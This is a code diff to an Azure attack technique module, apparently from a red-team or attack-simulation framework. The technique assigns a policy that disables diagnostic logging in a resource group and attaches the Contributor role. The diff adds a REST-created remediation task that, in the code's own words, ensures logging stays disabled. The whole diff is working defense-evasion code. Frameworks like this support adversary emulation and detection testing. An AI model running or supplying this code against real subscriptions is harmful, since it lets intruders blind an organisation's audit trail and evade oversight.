@@ -6,6 +6,7 @@ from azure.mgmt.authorization import AuthorizationManagementClient
 from core.azure.azure_access import AzureAccess
 import uuid
 import time
+import requests
 
 @TechniqueRegistry.register
 class AzureAbuseAzurePolicyToDisableLogging(BaseTechnique):
@@ -53,11 +54,11 @@ class AzureAbuseAzurePolicyToDisableLogging(BaseTechnique):
             # Retrieve subscription id
             current_sub_info = AzureAccess().get_current_subscription_info()
             subscription_id = current_sub_info.get("id")
-            
-            # create client
+
+            # create clients
             policy_client = PolicyClient(credential, subscription_id)
             auth_client = AuthorizationManagementClient(credential, subscription_id)
-            
+
             # Create a policy definition with DeployIfNotExists effect
             policy_definition = {
                 "properties": {
@@ -152,9 +153,9 @@ class AzureAbuseAzurePolicyToDisableLogging(BaseTechnique):
                     "location": az_region
                 }
             )
-        
+
             print(f"Policy '{policy_assignment.name}' assigned to resource group '{resource_group_name}'.")
-            
+
             # Waiting for changes to replicate
             time.sleep(30)
 
@@ -171,15 +172,38 @@ class AzureAbuseAzurePolicyToDisableLogging(BaseTechnique):
                 parameters=role_assignment_params
             )
 
+            # Create a remediation task using REST API
+            remediation_task_name = "RemediateDiagnosticSettings"
+            remediation_scope = f"/subscriptions/{subscription_id}/resourceGroups/{resource_group_name}"
+            url = f"https://management.azure.com/{remediation_scope}/providers/Microsoft.PolicyInsights/remediations/{remediation_task_name}?api-version=2019-07-01"
+            headers = {
+                "Authorization": f"Bearer {credential.get_token('https://management.azure.com/.default').token}",
+                "Content-Type": "application/json"
+            }
+            remediation_body = {
+                "properties": {
+                    "policyAssignmentId": policy_assignment.id,
+                    "resourceDiscoveryMode": "ReEvaluateCompliance"
+                }
+            }
+
+            response = requests.put(url, headers=headers, json=remediation_body)
+
+            if response.status_code == 200 or response.status_code == 201:
+                print(f"Remediation task '{remediation_task_name}' created to enforce logging settings.")
+            else:
+                print(f"Failed to create remediation task: {response.content}")
+
             # Return results
             return ExecutionStatus.SUCCESS, {
-                "message": f"Malicious policy created and assigned, disabling diagnostic settings in resource group '{resource_group_name}', with Contributor role attached.",
+                "message": f"Malicious policy created and assigned, disabling diagnostic settings in resource group '{resource_group_name}', with Contributor role attached. Remediation task created to ensure logging stays disabled.",
                 "value": {
-                    "policy_name" : policy_assignment.name,
-                    "target_subscription_id" : subscription_id,
-                    "target_resource_group" : resource_group_name,
-                    "role_attached" : "Contributor",
-                    "message" : "Malicious policy created and assigned, disabling diagnostic settings in resource group"
+                    "policy_name": policy_assignment.name,
+                    "target_subscription_id": subscription_id,
+                    "target_resource_group": resource_group_name,
+                    "role_attached": "Contributor",
+                    "remediation_task": remediation_task_name,
+                    "message": "Malicious policy created and assigned, with remediation task created to ensure logging stays disabled."
                 }
             }
         except Exception as e:
